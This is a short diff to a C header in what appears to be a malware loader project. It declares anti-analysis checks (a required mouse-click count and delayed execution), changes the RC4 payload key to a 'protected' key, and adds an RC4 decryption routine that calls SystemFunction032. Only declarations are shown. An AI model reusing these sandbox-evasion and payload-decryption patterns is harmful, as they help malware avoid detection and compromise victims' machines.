@@ -21,9 +21,6 @@ extern DWORD g_dwMouseClicks;
 // Minimum click for passing anti-analysis
 #define REQUIRED_CLICKS 7
 
-// Payload encryption key
-extern UCHAR Rc4Key[];
-
 /*--------------------------------------------------------------------
   STRUCTURES
 --------------------------------------------------------------------*/
@@ -611,6 +608,10 @@ BOOL DelayExec(DWORD dwMilliSeconds);
 BOOL AntiAnalysis(DWORD dwMilliSeconds);
 
 // Defined in Cryptor.c
+extern unsigned char ProtectedKey[];
+
+#define KEY_SIZE 16
+
 typedef struct _USTRING
 {
 	DWORD   Length;
@@ -623,3 +624,5 @@ typedef NTSTATUS(NTAPI* fnSystemFunction032) (
 	struct USTRING* Img,
 	struct USTRING* Key
 	);
+
+BOOL Rc4DecryptionViSystemFunc032(IN PBYTE pRc4Key, IN PBYTE pPayloadData, IN DWORD dwRc4KeySize, IN DWORD sPayloadSize);
